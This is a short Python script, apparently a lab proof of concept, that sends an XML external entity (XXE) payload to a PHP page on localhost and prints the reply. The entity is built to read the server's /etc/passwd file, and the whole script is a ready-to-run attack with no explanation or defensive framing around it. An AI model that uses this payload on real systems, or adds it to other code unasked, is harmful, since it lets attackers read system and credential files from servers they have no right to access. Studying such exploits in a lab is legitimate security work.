import requests

body ='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
'''
print(body)
resp = requests.post("http://127.0.0.1:8080/dom.php",data=body)
print(resp.text)